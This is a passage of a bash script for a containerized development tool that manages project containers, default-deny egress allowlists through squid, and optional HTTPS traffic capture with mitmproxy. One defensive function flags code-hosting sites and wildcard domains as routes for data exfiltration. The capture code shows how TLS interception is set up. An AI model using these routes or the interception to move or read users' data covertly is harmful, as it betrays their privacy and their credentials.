  # file created here), so the non-root entrypoint can rebuild it on every start
  # as base lines + hostname + two optional sources it merges in-container:
  #   * the project flake's declared entries (its profile's etc/hosts.extra) —
  #     read from the per-project profile already on NIXENV_EXTRA_PROFILE;
  #   * <project>/hosts.extra (host-side, local-only) — bind-mounted here if present.
  # With neither source it's just the base entries (equivalent to the default).
  local hostsmount
  touch "$pdir/etc-hosts"   # writable placeholder owned by us; entrypoint fills it
  hostsmount=(-v "$pdir/etc-hosts:/etc/hosts")
  [ -f "$pdir/hosts.extra" ] && hostsmount+=(-v "$pdir/hosts.extra:/etc/hosts.extra:ro")
  # The proxy's root CA (mkcert's or Caddy's internal), so the container can
  # trust https://*.$PROXY_DOMAIN. The entrypoint merges it into a CA bundle.
  [ -f "$PROXY_DIR/certs/rootCA.pem" ] && hostsmount+=(-v "$PROXY_DIR/certs/rootCA.pem:/etc/nixenv-proxy-ca.crt:ro")
  # 'capture' on: trust mitmproxy's CA, or every HTTPS request fails its check.
  # Trusting it is what lets the egress container read the traffic, so it is
  # mounted only for a project that has captured (capture_ca_trusted). Wait for
  # the CA only while capturing: with capture off mitmproxy isn't running and
  # would never write it.
  local capca="$EGRESS_DATA_DIR/mitmproxy/mitmproxy-ca-cert.pem"
  if [ "$restricted" = 1 ] && capture_ca_trusted "$name"; then
    if project_captures "$name" egress; then
      capture_wait_ca || warn "capture CA not ready yet — HTTPS from '$name' will fail until '$0 stop $name && $0 run $name'"
    fi
    [ -f "$capca" ] && hostsmount+=(-v "$capca:/etc/nixenv-capture-ca.crt:ro")
  fi

  if container_running "$cname"; then
    ok "Project '$name' already running as '$cname'"
    # A container created before key auth still runs the old, open sshd
    # — the fix only applies at creation. Say so, since nothing else would.
    if ! "$ENGINE" inspect -f '{{range .Mounts}}{{.Destination}} {{end}}' "$cname" 2>/dev/null \
         | grep -q '/etc/nixenv/authorized_keys'; then
      warn "'$name' was started before key-only ssh — it still accepts password-less logins"
      echo "    apply it with: $0 stop $name && $0 run $name"
    fi
    if ! "$ENGINE" inspect -f '{{range .Mounts}}{{.Destination}} {{end}}' "$cname" 2>/dev/null \
         | grep -q '/etc/nixenv/ssh_host_ed25519_key'; then
      warn "'$name' was started before host-key pinning — 'ssh $name' will report a changed host key"
      echo "    apply it with: $0 stop $name && $0 run $name"
    fi
    container_needs_recreate "$name" "$restricted" || true
  else
    container_exists "$cname" && "$ENGINE" rm -f "$cname" >/dev/null 2>&1 || true
    log "Starting service '$cname' ($RUNTIME_IMAGE) as uid $(id -u) — sshd on 127.0.0.1:$port, volumes $appv → $appmnt, $homev → /home/$APP_USER"
    # Extra engine parameters from <project>/extra-parameters, split into an
    # ARRAY so each flag becomes its own argv entry.
    # (if/fi, NOT `[ ] && cmd`: a false test would return 1 under set -e.)
    # Hardening, placed BEFORE extra_args so a deliberate override in
    # extra-parameters (e.g. --cap-add for podman-in-container) still wins.
    local harden; harden=($(container_hardening_args))
    local _extra extra_args; _extra="$(project_extra_args "$name")"; extra_args=()
    if [ -n "$_extra" ]; then
      extra_args=($_extra)
      log "extra parameters ($pdir/extra-parameters): $_extra"
    fi
    "$ENGINE" run -d \
      --name "$cname" \
      --hostname "$name" \
      --network "$netarg" \
      --user "$(id -u):$(id -g)" \
      $(engine_userns) \
      ${harden[@]+"${harden[@]}"} \
      ${extra_args[@]+"${extra_args[@]}"} \
      --sysctl net.ipv4.ping_group_range="0 2147483647" \
      --sysctl net.ipv4.ip_unprivileged_port_start=0 \
      ${pub[@]+"${pub[@]}"} \
      ${egress_env[@]+"${egress_env[@]}"} \
      "${hostsmount[@]}" \
      -v "$NIX_VOLUME":/nix:ro \
      -v "$homev":/home/"$APP_USER" \
      -v "$appv":"$appmnt" \
      -v "$dbv":/databases \
      -v "$pdir/passwd":/etc/passwd:ro \
      -v "$pdir/group":/etc/group:ro \
      -v "$pdir/shadow":/etc/shadow:ro \
      -v "$pdir/ssh/authorized_keys":/etc/nixenv/authorized_keys:ro \
      -v "$pdir/ssh/host_ed25519_key":/etc/nixenv/ssh_host_ed25519_key:ro \
      -v "$cprof/dot-claude":/home/"$APP_USER"/.claude \
      -v "$CLAUDE_DIR/projects/nixenv-$name":/home/"$APP_USER"/.claude/projects \
      -v "$CLAUDE_DIR/.credentials.json":/home/"$APP_USER"/.claude/.credentials.json \
      -v "$cprof/claude.json":/home/"$APP_USER"/.claude.json \
      -v "$ENTRYPOINT_FILE":/usr/local/bin/nixenv-entrypoint:ro \
      -w "$appmnt" \
      -e HOME=/home/"$APP_USER" \
      -e PROFILE="$PROFILE" \
      -e APP_USER="$APP_USER" \
      -e SSHD_PORT="$SSHD_PORT" \
      -e NIXENV_PROJECT="$name" \
      -e NIXENV_APP_MOUNT="$appmnt" \
      -e CLAUDE_CODE_PROJECT_DIR_NAME="nixenv-$name" \
      -e NIXENV_PROXY_NAME="$PROXY_NAME" \
      -e NIXENV_CONTAINER_PREFIX="$CONTAINER_PREFIX" \
      -e NIXENV_PROXY_DOMAIN="$PROXY_DOMAIN" \
      -e NIXENV_EXTRA_PROFILE="$(project_profile "$name")" \
      "$(img "$RUNTIME_IMAGE")" \
      sh /usr/local/bin/nixenv-entrypoint >/dev/null
    ok "Started '$cname'"
  fi
  if [ "$restricted" = 1 ]; then
    # Refresh so the proxy picks up this project's ACL + ssh/port relays (the
    # relays need the container to exist, hence after the start above).
    log "Refreshing proxy (egress allowlist + ssh relay for '$name')"
    ( PROXY_MKCERT_INSTALL="${PROXY_MKCERT_INSTALL:-0}"; cmd_proxy up ) \
      || warn "proxy refresh failed — '$0 proxy up' manually (ssh relies on its relay)"
  else
    ensure_proxy_running   # bring the shared proxy up on first project start
  fi
  echo "   ssh:    $0 ssh $name   (or: ssh -p $port -i $pdir/ssh/id_ed25519 $APP_USER@127.0.0.1)"
  echo "   shell:  $0 shell $name   ($ENGINE exec, no key needed)"
  if [ "$restricted" = 1 ]; then
    echo "   egress: RESTRICTED — allowed: $(tr '\n' ' ' < "$pdir/allowed_hosts" 2>/dev/null || echo '(none)')"
    echo "           add hosts: $0 allow $name <domain>…   watch: $0 egress $name"
  fi
  if [ "$restricted" = 1 ] && [ -f "$pdir/capture" ]; then
    echo "   capture: ON ($(capture_directions "$name")) — $0 capture $name web | log -f | tui"
  fi
  if [ "$PROXY_AUTOSTART" = 1 ] && container_running "$PROXY_NAME"; then
    echo "   proxy:  https://$name-<port>.$PROXY_DOMAIN/   (via '$PROXY_NAME')"
  fi
  if [ -f "$pdir/ports" ] && grep -q '[^[:space:]]' "$pdir/ports" 2>/dev/null; then
    echo "   ports:  $(grep -v '^[[:space:]]*#' "$pdir/ports" | tr -s '[:space:]' ' ')"
  fi
  if [ -f "$pdir/hosts.extra" ] && grep -q '[^[:space:]]' "$pdir/hosts.extra" 2>/dev/null; then
    echo "   hosts:  merged /etc/hosts.extra ($(grep -vc '^[[:space:]]*#' "$pdir/hosts.extra") entries)"
  fi
  echo "   stop:   $0 stop $name"
}

# =============================================================================
# expose — publish extra port(s) for a project (stored in <project>/ports),
#          then restart it to apply. Examples of a <spec>:
#   8080            → 127.0.0.1:8080:8080  (loopback, host==container)
#   3000:3000       → host:container on 127.0.0.1
#   0.0.0.0:80:80   → bind all interfaces (reachable from your network)
# =============================================================================
cmd_expose() {
  local name="${1:-}"
  [ -n "$name" ] || die "usage: $0 expose <project> <port|host:container>..."
  case "$name" in */*|.|..) die "invalid project name: $name";; esac
  shift
  [ "$#" -gt 0 ] || die "give at least one port to expose"
  local pdir; pdir="$(project_dir "$name")"
  [ -d "$pdir" ] || die "unknown project '$name' — run '$0 init $name' first"

  local pf="$pdir/ports" p
  touch "$pf"
  for p in "$@"; do
    p="$(printf '%s' "$p" | tr -d '[:space:]')"
    [ -n "$p" ] || continue
    if grep -qxF "$p" "$pf" 2>/dev/null; then
      warn "already listed: $p"
    else
      printf '%s\n' "$p" >> "$pf"; ok "added port $p"
    fi
  done

  if resolve_engine 2>/dev/null && container_running "$(container_name "$name")"; then
    warn "restarting '$name' to apply the new ports"
    cmd_stop "$name" >/dev/null 2>&1 || true
    cmd_run "$name"
  else
    log "ports saved — they apply on the next '$0 run $name'"
  fi
}

# =============================================================================
# host — convenience: append /etc/hosts entries to <project>/hosts.extra (native
#        /etc/hosts format), then restart to apply. You can equally edit the file
#        by hand — the entrypoint merges it into /etc/hosts on every start.
#        Each <entry> is "name:ip" (converted to "ip<TAB>name"). Examples:
#   db:10.0.0.5        →  10.0.0.5   db
#   api.local:127.0.0.1
# =============================================================================
cmd_host() {
  local name="${1:-}"
  [ -n "$name" ] || die "usage: $0 host <project> <name:ip>..."
  case "$name" in */*|.|..) die "invalid project name: $name";; esac
  shift
  [ "$#" -gt 0 ] || die "give at least one 'name:ip' entry"
  local pdir; pdir="$(project_dir "$name")"
  [ -d "$pdir" ] || die "unknown project '$name' — run '$0 init $name' first"

  local hf="$pdir/hosts.extra" h nm ip line
  touch "$hf"
  for h in "$@"; do
    h="$(printf '%s' "$h" | tr -d '[:space:]')"
    [ -n "$h" ] || continue
    case "$h" in *:*) ;; *) die "invalid entry '$h' — expected name:ip";; esac
    nm="${h%%:*}"; ip="${h#*:}"   # ip = everything after the FIRST ':' (IPv6-safe)
    [ -n "$nm" ] && [ -n "$ip" ] || die "invalid entry '$h' — expected name:ip"
    # The ip part must be a literal address: IPv4 (digits/dots) or IPv6 (has ':').
    # Names like 'host-gateway' are --add-host magic, invalid in a hosts file.
    # To reach a public <project>-<port>.$PROXY_DOMAIN URL from inside the
    # container, use 127.0.0.1 — the loopback relay forwards it to the proxy.
    case "$ip" in
      *:*) ;;                                  # IPv6
      *[!0-9.]*) die "'$ip' is not an IP address (hosts.extra needs literal IPs)";;
    esac
    line="$(printf '%s\t%s' "$ip" "$nm")"
    if grep -qxF "$line" "$hf" 2>/dev/null; then
      warn "already listed: $line"
    else
      printf '%s\n' "$line" >> "$hf"; ok "added host: $ip $nm"
    fi
  done

  if resolve_engine 2>/dev/null && container_running "$(container_name "$name")"; then
    warn "restarting '$name' to apply the new hosts"
    cmd_stop "$name" >/dev/null 2>&1 || true
    cmd_run "$name"
  else
    log "hosts saved — they apply on the next '$0 run $name'"
  fi
}

# =============================================================================
# restrict — toggle egress restriction for a project. ON is the DEFAULT for
#            every project; 'off' opts out (writes the <project>/unrestricted
#            marker), 'on' re-enables.
#   usage: restrict <project> [on|off]     (default: on)
# =============================================================================
cmd_restrict() {
  local name="${1:-}" mode="${2:-on}"
  [ -n "$name" ] || die "usage: $0 restrict <project> [on|off]"
  case "$name" in */*|.|..) die "invalid project name: $name";; esac
  local pdir; pdir="$(project_dir "$name")"
  [ -d "$pdir" ] || die "unknown project '$name' — run '$0 init $name' first"

  case "$mode" in
    on)
      rm -f "$pdir/unrestricted"; touch "$pdir/allowed_hosts"
      ok "egress restriction ON for '$name' (default-deny — this is the default)"
      log "validated hosts file: $pdir/allowed_hosts  (add with: $0 allow $name <domain>…)"
      ;;
    off)
      touch "$pdir/unrestricted"
      warn "egress restriction OFF for '$name' — full internet access (allowed_hosts kept)"
      ;;
    *) die "usage: $0 restrict <project> [on|off]";;
  esac

  # Apply now if the project is running: recreate it on the right network, which
  # also refreshes the proxy (ACLs, relays).
  if resolve_engine 2>/dev/null && container_running "$(container_name "$name")"; then
    warn "restarting '$name' to apply"
    cmd_stop "$name" >/dev/null 2>&1 || true
    cmd_run "$name"
  else
    log "applies on the next '$0 run $name'"
  fi
}

# =============================================================================
# allow — add validated egress host(s) to a project's allowlist and reload.
#   usage: allow <project> <domain|ip>...
# =============================================================================
cmd_allow() {
  local name="${1:-}"
  [ -n "$name" ] || die "usage: $0 allow <project> <domain|ip>..."
  case "$name" in */*|.|..) die "invalid project name: $name";; esac
  shift
  [ "$#" -gt 0 ] || die "give at least one domain (e.g. registry.npmjs.org)"
  local pdir d; pdir="$(project_dir "$name")"
  [ -d "$pdir" ] || die "unknown project '$name' — run '$0 init $name' first"

  local nd
  for d in "$@"; do
    [ -n "$(printf '%s' "$d" | tr -d '[:space:]')" ] || continue
    nd="$(normalize_allowed_host "$d")" \
      || die "invalid host '$d' (domain, .domain for subdomains, or IP — no schemes/ports/paths)"
    add_allowed_host "$name" "$nd"
  done

  if ! is_restricted "$name"; then
    log "saved — note '$name' is NOT restricted (it opted out; enable: $0 restrict $name on)"
    return 0
  fi
  # HOT-reload squid's ACLs — no egress/proxy recreate, so relayed ssh/zmx
  # sessions, open tunnels and ingress stay up. (write_egress_configs overwrites the bind-mounted config in
  # place; 'squid -k reconfigure' re-reads it.) Falls back to a full 'proxy up'
  # if squid isn't running in the proxy yet (e.g. proxy predates restriction).
  if resolve_engine 2>/dev/null && container_running "$EGRESS_NAME"; then
    write_egress_configs
    if "$ENGINE" exec "$EGRESS_NAME" "$PROFILE/bin/squid" -f /etc/egress/squid.conf -k reconfigure >/dev/null 2>&1; then
      ok "allowlist reloaded (hot — no proxy restart)"
    else
      warn "hot reload failed — recreating the proxy"
      ( PROXY_MKCERT_INSTALL="${PROXY_MKCERT_INSTALL:-0}"; cmd_proxy up )
    fi
  else
    log "applies when the proxy starts ('$0 proxy up' or next '$0 run $name')"
  fi
}

# =============================================================================
# egress — show a restricted project's egress log (squid): which domains were
#          requested, what was allowed (TCP_TUNNEL) vs denied (TCP_DENIED).
#   usage: egress <project> [-f]
# =============================================================================
# Point out allowlist entries that are wider than they look. An allowed
# host is a place data can be SENT, not just fetched from.
egress_allowlist_notes() {
  local pdir f d wild="" forges=""
  pdir="$(project_dir "$1")"; f="$pdir/allowed_hosts"
  [ -f "$f" ] || return 0
  while IFS= read -r d || [ -n "$d" ]; do
    d="$(printf '%s' "${d%%#*}" | tr -d '[:space:]')"
    [ -n "$d" ] || continue
    case "$d" in .*) wild="$wild $d";; esac
    case "$d" in
      github.com|.github.com|gist.github.com|*githubusercontent.com|gitlab.com|.gitlab.com|bitbucket.org|codeberg.org|gitlab.*|git.*)
        forges="$forges $d";;
    esac
  done < "$f"
  if [ -n "$wild$forges" ] || [ ! -f "$pdir/ssh_hosts" ]; then
    echo "── allowlist notes ─────────────────────────────────"
  fi
  if [ -n "$wild" ]; then
    echo "   wildcards:$wild"
    echo "     → every subdomain is allowed, including ones other people control"
  fi
  if [ -n "$forges" ]; then
    echo "   forges:$forges"
    echo "     → code can push to ANY repo/gist there, not just yours (an exit for data)"
  fi
  if [ ! -f "$pdir/ssh_hosts" ]; then
    echo "   port 22 is open to every allowed host — list your git hosts in"
    echo "     $pdir/ssh_hosts to limit it (then '$0 proxy reload')"
  fi
  return 0
}

cmd_egress() {
  local name="${1:-}" follow="${2:-}"
  [ -n "$name" ] || die "usage: $0 egress <project> [-f]"
  case "$name" in */*|.|..) die "invalid project name: $name";; esac
  # squid moved to its own container; an older proxy logged into the proxy dir.
  local logf="$EGRESS_DATA_DIR/egress.log"
  [ -f "$logf" ] || [ ! -f "$PROXY_DIR/data/egress.log" ] || logf="$PROXY_DIR/data/egress.log"
  [ -f "$logf" ] || die "no egress log at $logf — is the proxy running with a restricted project?"

  # Squid access log: time elapsed client action/status bytes method host:port …
  # Filter to this project via its internal-net subnet prefix when we can.
  local prefix=""
  if resolve_engine 2>/dev/null; then
    prefix="$(net_subnet "$(internal_net "$name")" 2>/dev/null | cut -d/ -f1 | sed 's/\.0*$//')"
  fi

  if [ "$follow" = "-f" ]; then
    log "following $logf (Ctrl-C to stop)"
    if [ -n "$prefix" ]; then exec tail -f "$logf" | grep --line-buffered "$prefix"
    else exec tail -f "$logf"; fi
  fi

  log "Egress for '$name' (log: $logf)"
  egress_allowlist_notes "$name"
  local lines
  if [ -n "$prefix" ]; then lines="$(grep "$prefix" "$logf" 2>/dev/null || true)"
  else lines="$(cat "$logf" 2>/dev/null || true)"; warn "could not resolve '$name' subnet — showing ALL projects"; fi
  [ -n "$lines" ] || { warn "no egress traffic logged yet"; return 0; }

  # URI field ($7) is "host:port" for CONNECT but a full "http://host/path" for
  # plain-HTTP requests — strip scheme/path/port down to the bare domain.
  _dom='s#^[a-z]*://##; s#/.*$##; s#:[0-9]*$##'
  echo "── allowed (validated) ─────────────────────────────"
  printf '%s\n' "$lines" | awk '$4 !~ /DENIED/ {print $7}' | sed "$_dom" | sort | uniq -c | sort -rn | head -20
  echo "── DENIED (add with: $0 allow $name <domain>) ──"
  printf '%s\n' "$lines" | awk '$4 ~ /DENIED/ {print $7}' | sed "$_dom" | sort | uniq -c | sort -rn | head -20
  echo "── last 10 raw entries ─────────────────────────────"
  printf '%s\n' "$lines" | tail -10
}

# =============================================================================
# capture — record a restricted project's HTTP(S) traffic with mitmproxy.
#   usage: capture <project> [on [egress|ingress]|off|untrust|status|web|log [-f]|tui|har <file>|clear]
# =============================================================================
# mitmproxy runs in the egress container BEHIND squid: squid still decides what
# a project may reach (and refuses the rest without resolving it); only allowed
# requests reach the project's own mitmproxy listener. 'egress' = the project's
# outbound requests (HTTPS is decrypted: the container trusts mitmproxy's CA
# while capture is on); 'ingress' = requests to its public URLs, routed by Caddy
# through mitmproxy on the way in. Files: $EGRESS_DATA_DIR/captures/<p>.{flows,log}.
cmd_capture() {
  local name="${1:-}" sub="${2:-status}"
  [ -n "$name" ] || die "usage: $0 capture <project> [on [egress|ingress]|off|untrust|status|web|log [-f]|tui|har <file>|clear]"
  case "$name" in */*|.|..) die "invalid project name: $name";; esac
  local pdir; pdir="$(project_dir "$name")"
  [ -d "$pdir" ] || die "unknown project '$name' — run '$0 init $name' first"
  local cdir="$EGRESS_DATA_DIR/captures"
  local flows="$cdir/$name.flows" logf="$cdir/$name.log"

  case "$sub" in
    on)
      # Only a restricted project has squid (and so mitmproxy) in its path; an
      # unrestricted one talks to the internet directly.
      is_restricted "$name" || die "'$name' is unrestricted — its traffic does not go through the egress proxy. Enable with: $0 restrict $name on"
      local dirs="${3:-}"
      case "$dirs" in
        ""|both) dirs="egress
ingress";;
        egress|ingress) ;;
        *) die "usage: $0 capture $name on [egress|ingress]   (default: both)";;
      esac
      require_engine
      volume_exists && "$ENGINE" run --rm -v "$NIX_VOLUME":/nix:ro "$(img "$RUNTIME_IMAGE")" \
          test -x "$PROFILE/bin/mitmweb" >/dev/null 2>&1 \
        || die "mitmproxy is not in the shared store yet — run '$0 build' (or '$0 update') first"
      printf '%s\n' "$dirs" > "$pdir/capture"
      # Keep trusting the CA after 'off', so the NEXT capture needs no restart.
      project_captures "$name" egress && : > "$pdir/capture-trust"
      warn "Captures record EVERYTHING that crosses the wire — tokens, cookies, git"
      warn "credentials included. They stay on this machine (owner-only): $cdir"
      capture_apply "$name"
      ok "capture ON for '$name' ($(capture_directions "$name"))"
      if project_captures "$name" egress && container_running "$(container_name "$name")" \
         && ! container_needs_recreate "$name" 1 >/dev/null 2>&1; then
        warn "'$name' must restart to trust the capture CA — until then its HTTPS requests FAIL"
        log  "(one time only: it keeps trusting the CA from now on — '$0 capture $name untrust' revokes)"
        if confirm_tty "Restart '$name' now?"; then
          cmd_stop "$name" && cmd_run "$name"
        else
          echo "    apply it with: $0 stop $name && $0 run $name"
        fi
      fi
      echo "   UI:   $0 capture $name web      live log: $0 capture $name log -f"
      ;;
    off)
      [ -f "$pdir/capture" ] || { log "capture is already off for '$name'"; return 0; }
      rm -f "$pdir/capture"
      capture_apply "$name"
      ok "capture OFF for '$name' (recorded files kept — '$0 capture $name clear' deletes them)"
      if capture_ca_trusted "$name"; then
        log "'$name' keeps trusting the capture CA, so the next 'capture on' needs no restart"
        log "    revoke: $0 capture $name untrust"
      fi
      ;;
    untrust)
      project_captures "$name" egress && die "egress capture is on for '$name' — '$0 capture $name off' first"
      [ -f "$pdir/capture-trust" ] || { log "'$name' does not keep the capture CA"; return 0; }
      rm -f "$pdir/capture-trust"
      ok "'$name' no longer trusts the capture CA after its next restart"
      if container_running "$(container_name "$name")" 2>/dev/null; then
        echo "    apply it with: $0 stop $name && $0 run $name"
      fi
      ;;
    status)
      if [ -f "$pdir/capture" ]; then ok "capture ON for '$name' ($(capture_directions "$name"))"
      else log "capture OFF for '$name'"; fi
      [ -f "$pdir/capture-trust" ] && echo "   trusts the capture CA (kept after the first capture; '$0 capture $name untrust' revokes)"
      [ -f "$flows" ] && echo "   flows: $flows ($(wc -c < "$flows" | tr -d ' ') bytes)"
      [ -f "$logf" ]  && echo "   log:   $logf ($(wc -l < "$logf" | tr -d ' ') requests)"
      return 0
      ;;
    web)
      [ -f "$pdir/capture" ] || die "capture is off for '$name' — turn it on first: $0 capture $name on"
      local tok; tok="$(cat "$EGRESS_DATA_DIR/mitmweb.token" 2>/dev/null || true)"
      [ -n "$tok" ] || die "no capture UI yet — '$0 proxy up' starts it"
      require_engine
      container_running "$EGRESS_NAME" || warn "the egress proxy is not running — '$0 proxy up'"
      container_running "$PROXY_NAME" || warn "the proxy is not running — '$0 proxy up'"
      # One mitmweb serves every captured project; the fragment pre-filters it
      # to this one (flows are tagged '<project> <direction>').
      log "mitmweb UI (pre-filtered to '$name'; clear the filter to see every captured project):"
      echo "    $(capture_ui_url "$name")/?token=$tok#/flows?s=~comment%20$name"
      echo "    (the token is the UI password — treat the URL as a secret)"
      ;;
    log)
      [ -f "$logf" ] || die "nothing captured for '$name' yet ($logf)"
      if [ "${3:-}" = "-f" ]; then exec tail -f "$logf"; fi
      tail -n 50 "$logf"
      ;;
    tui)
      [ -f "$flows" ] || die "nothing captured for '$name' yet ($flows)"
      require_engine
      container_running "$EGRESS_NAME" || die "the egress proxy is not running — '$0 proxy up'"
      # Read-only: -n (no proxy listener) over the recorded file.
      exec "$ENGINE" exec -it -e TERM="${TERM:-xterm-256color}" -e HOME=/data "$EGRESS_NAME" \
        "$PROFILE/bin/mitmproxy" -n -r "/data/captures/$name.flows" --set confdir=/data/mitmproxy
      ;;
    har)
      local out="${3:-}"
      [ -n "$out" ] || die "usage: $0 capture $name har <file.har>"
      [ -f "$flows" ] || die "nothing captured for '$name' yet ($flows)"
      require_engine
      container_running "$EGRESS_NAME" || die "the egress proxy is not running — '$0 proxy up'"
      "$ENGINE" exec -e HOME=/data "$EGRESS_NAME" "$PROFILE/bin/mitmdump" -q -n \
          -r "/data/captures/$name.flows" --set confdir=/data/mitmproxy \
          --set hardump="/data/captures/$name.har" \
        || die "mitmdump could not export $flows"
      ( umask 077; cat "$cdir/$name.har" > "$out" ) && rm -f "$cdir/$name.har"
      ok "wrote $out (contains whatever was captured — treat it as a secret)"
      ;;
    clear)
      rm -f "$flows" "$logf"
      # mitmproxy holds the files open — and every project's flows in the UI.
      if resolve_engine 2>/dev/null && container_running "$EGRESS_NAME"; then capture_restart; fi
      ok "deleted the captures of '$name' (the UI restarted: its view of every project is cleared)"
      ;;
    *) die "usage: $0 capture <project> [on [egress|ingress]|off|untrust|status|web|log [-f]|tui|har <file>|clear]";;
  esac
}

# Regenerate squid/mitmproxy/Caddy config after <project>/capture changed and
# apply it live: squid reloads, mitmproxy restarts with the new listeners, and
# Caddy reloads its ingress routes. Nothing is recreated unless the capture UI
# port must appear or disappear. Without a running proxy it applies at next run.
capture_apply() {
  resolve_engine 2>/dev/null || { log "applies at the next '$0 run $1'"; return 0; }
  if ! container_running "$PROXY_NAME"; then
    log "applies when the proxy starts ('$0 proxy up' or next '$0 run $1')"
    return 0
  fi
  ( PROXY_MKCERT_INSTALL="${PROXY_MKCERT_INSTALL:-0}"; cmd_proxy reload ) \
    || warn "proxy reload failed — '$0 proxy up' applies it"
  if project_captures "$1" egress; then
    capture_wait_ca || warn "mitmproxy has not written its CA yet — see '$0 proxy logs egress'"
  fi
}

# =============================================================================
# proxy — a shared Caddy reverse proxy for all projects. Routes
#   https://<project>-<port>.<PROXY_DOMAIN>/  →  nixenv-<project>:<port>
# over the shared user network. TLS uses a trusted wildcard cert when `mkcert`
# is installed, else Caddy's internal CA. Caddy binds 8080/8443 in-container
# (non-root); the host publish maps PROXY_HTTP_PORT/PROXY_HTTPS_PORT onto them.
# =============================================================================

# Issue a trusted wildcard cert with mkcert if available (into $PROXY_DIR/certs).
# Returns 0 when a cert is ready, 1 to signal "use Caddy internal CA".
#
# The only step that can prompt for a password is 'mkcert -install', which adds
# mkcert's local CA to your OS/browser trust stores. We ONLY run it when the CA
# isn't already installed, and we print exactly what it does first. Skip it with
# PROXY_MKCERT_INSTALL=0 (HTTPS still works, browser shows a warning). The
# auto-start on 'run' defaults PROXY_MKCERT_INSTALL=0 so 'run' never prompts.
proxy_make_cert() {
  have mkcert || {
    log "mkcert not found — using Caddy's internal CA (browsers warn until trusted)"
    log "  for trusted certs:  brew install mkcert nss, then re-run '$0 proxy up'"
    return 1
  }
  mkdir -p "$PROXY_DIR/certs"

  # Only touch trust stores (the part that may ask for a password) when mkcert's
  # local CA doesn't exist yet. If it's already there, -install is a silent no-op.
  local caroot; caroot="$(mkcert -CAROOT 2>/dev/null || true)"
  if [ -n "$caroot" ] && [ -f "$caroot/rootCA.pem" ]; then
    :   # CA already installed — no prompt, nothing to explain
  elif [ "${PROXY_MKCERT_INSTALL:-1}" = 1 ]; then
    echo
    warn "About to run 'mkcert -install' — a ONE-TIME step that may ask for your password."
    log  "What it does (nothing leaves this machine):"
    log  "  • creates a local Certificate Authority under ${caroot:-the mkcert CA dir}"
    log  "  • adds that CA to your OS trust store (macOS keychain / Linux ca-certificates)"
    log  "    and to Firefox/Chrome — THIS is the step that may prompt for sudo/keychain"
    log  "  • lets your browser trust https://*.$PROXY_DOMAIN with no warning"
    log  "Don't want the script to do it? Any of these instead:"
    log  "  • press Ctrl-C now, run 'mkcert -install' yourself, then re-run '$0 proxy up'"
    log  "  • run:  PROXY_MKCERT_INSTALL=0 $0 proxy up   (skip trusting; HTTPS still works,"
    log  "    with a browser warning — or Caddy's internal CA if no cert is made)"
    echo
    mkcert -install || warn "mkcert -install failed — the cert may be untrusted"
  else
    log "PROXY_MKCERT_INSTALL=0 — not installing mkcert's CA (HTTPS will be untrusted)"
  fi

  if mkcert -cert-file "$PROXY_DIR/certs/wildcard.pem" -key-file "$PROXY_DIR/certs/wildcard-key.pem" \
       "*.$PROXY_DOMAIN" "$PROXY_DOMAIN" >/dev/null 2>&1; then
    # Publish the CA so CONTAINERS can trust these certs too (the host trusts it
    # via the OS store; containers get it mounted + merged into their bundle).
    [ -f "$caroot/rootCA.pem" ] && cp "$caroot/rootCA.pem" "$PROXY_DIR/certs/rootCA.pem" 2>/dev/null || true
    ok "issued wildcard cert for *.$PROXY_DOMAIN (mkcert)"; return 0
  fi
  warn "mkcert could not issue the wildcard cert — falling back to Caddy internal CA"; return 1
}

# Publish Caddy's INTERNAL CA root (used when mkcert isn't available) so project
# containers can trust https://*.$PROXY_DOMAIN. Caddy writes it on first start,
# so this runs after the proxy is up. No-op if the file isn't there (yet).
export_caddy_ca() {
  local src="$PROXY_DIR/data/caddy/pki/authorities/local/root.crt"
  [ -f "$PROXY_DIR/certs/rootCA.pem" ] && return 0   # mkcert CA already published
  if [ -f "$src" ]; then
    mkdir -p "$PROXY_DIR/certs"
    cp "$src" "$PROXY_DIR/certs/rootCA.pem" 2>/dev/null || return 1
    log "published Caddy's internal CA → $PROXY_DIR/certs/rootCA.pem (trusted inside containers)"
  fi
}

# Generate $PROXY_DIR/egress/:
#   squid.conf          per-project domain ACLs keyed by the project's internal-net
#                       subnet, default-deny; captured projects go via mitmproxy
#   capture.conf        mitmproxy listeners (see write_capture_files)
#   nixenv_capture.py   the mitmproxy addon
#   egress.sh           the EGRESS container's command (squid + mitmproxy)
#   start.sh            the PROXY container's command (socat relays + caddy)
# Also fills EGRESS_PUB (extra -p args for the proxy container: restricted
# projects' ssh/extra ports are published HERE and relayed over the internal
# net, because ports published on an --internal network don't work), sets
# EGRESS_PROJECTS to the restricted project names, CAPTURE_PROJECTS to those
# with capture on, CAPTURE_INGRESS to "name port" lines (write_caddyfile), and
# CAPTURE_CHANGED=1 when the mitmproxy listeners changed (it must restart).
write_egress_configs() {
  local edir="$PROXY_DIR/egress"
  # NOTE: never rm -rf this dir — it's bind-mounted into a possibly-running
  # proxy container, and replacing the directory inode would detach the mount
  # (a live 'squid -k reconfigure' would then read the OLD config forever).
  # Overwriting files in place keeps the mount coherent.
  mkdir -p "$edir"
  EGRESS_PUB=(); EGRESS_PROJECTS=""; EGRESS_SUBNETS=""; EGRESS_DEPLOYS=""
  CAPTURE_PROJECTS=""; CAPTURE_INGRESS=""; CAPTURE_CHANGED=0
  local relays="" acls="" gates="" sshgates="" allows="" all_srcs="" sshdoms d pdir name subnet aclname doms ips sshport _line _spec hp cp
  local peers="" capconf="" capn=0

  for pdir in "$PROJECTS_DIR"/*/; do
    [ -d "$pdir" ] || continue
    name="$(basename "$pdir")"
    is_restricted "$name" || continue
    ensure_internal_net "$name"
    subnet="$(net_subnet "$(internal_net "$name")")"
    if [ -z "$subnet" ]; then
      warn "cannot determine subnet of $(internal_net "$name") — skipping egress for '$name'"
      continue
    fi
    EGRESS_PROJECTS="$EGRESS_PROJECTS $name"
    # "<name> <subnet>" per line — write_caddyfile uses it for the cross-project guard.
    EGRESS_SUBNETS="$EGRESS_SUBNETS$name $subnet
"
    aclname="$(printf '%s' "$name" | tr -c 'a-zA-Z0-9' '_')"

    # Split allowed_hosts into domains and IPs. Domain matching is EXACT unless
    # subdomains are explicitly requested:
    #   yarnpkg.com     → only yarnpkg.com
    #   .yarnpkg.com    → yarnpkg.com AND *.yarnpkg.com (squid leading-dot form)
    #   *.yarnpkg.com   → same as .yarnpkg.com
    doms=""; ips=""
    if [ -f "$pdir/allowed_hosts" ]; then
      while IFS= read -r d || [ -n "$d" ]; do
        d="$(printf '%s' "${d%%#*}" | tr -d '[:space:]')"
        [ -n "$d" ] || continue
        case "$d" in
          \*.*)      doms="$doms .${d#\*.}";;   # *.foo → .foo (subdomains)
